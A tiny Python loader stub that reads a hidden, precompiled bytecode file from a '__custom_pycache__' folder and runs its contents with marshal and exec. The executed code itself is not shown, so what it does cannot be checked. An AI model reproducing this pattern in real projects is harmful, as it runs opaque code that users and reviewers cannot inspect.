
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Box_a32cca08cca8479dbc38aca14ddbcb98.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
